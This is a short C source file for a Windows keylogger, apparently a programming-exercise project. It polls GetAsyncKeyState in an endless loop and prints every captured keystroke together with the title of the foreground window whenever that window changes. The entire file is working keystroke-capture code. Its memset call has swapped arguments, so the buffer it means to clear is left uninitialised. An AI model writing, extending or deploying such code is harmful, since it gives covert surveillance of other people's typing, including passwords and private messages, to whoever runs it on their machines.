#include "winkey.h"

int			main(void)
{
	char		title[256];
	char		prev[256];

	memset(prev, 256, '\0');
	while (1)
	{
		for (int i = 8; i <= 190; i++)
		{
			if (GetAsyncKeyState(i) == -32767)
			{
				printf("%c\n", (char)i);
				GetWindowText(GetForegroundWindow(), title, 256);
				if (strcmp(prev, title))
				{
					memcpy(prev, title, strlen(title));
					prev[strlen(title)] = '\0';
					printf(" - '%s'\n", title);
				}
			}
		}
	}
}
